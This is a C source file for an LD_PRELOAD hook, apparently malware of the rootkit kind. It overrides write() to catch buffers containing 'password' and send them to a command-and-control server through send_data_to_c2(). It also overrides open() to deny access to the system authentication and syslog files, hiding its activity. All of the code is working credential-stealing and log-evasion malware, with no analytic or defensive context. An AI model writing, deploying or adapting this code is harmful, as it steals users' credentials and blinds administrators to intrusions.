/*LD_PRELOAD hook - Intercepts write() & open() to capture credentials & block logs*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include "connect.h"

static ssize_t (*original_write)(int, const void *, size_t) = NULL;
static int (*original_open)(const char *, int, ...) = NULL; // ... is used to manage the optional arguments to the open() function

const char *BLOCKED_FILES[] = {
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/secure",
    NULL
};

// Intercepts `write()` calls to capture credentials
ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }

    // Capture SSH credentials
    if (count > 5 && strstr(buf, "password")) {
        send_data_to_c2(buf);
    }

    return original_write(fd, buf, count);
}

// Intercepts `open()` to block access to logs
int open(const char *pathname, int flags, ...) {
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }

    for (int i = 0; BLOCKED_FILES[i] != NULL; i++) {
        if (strstr(pathname, BLOCKED_FILES[i])) {
            errno = EACCES; 
            return -1;
        }
    }

    return original_open(pathname, flags);
}
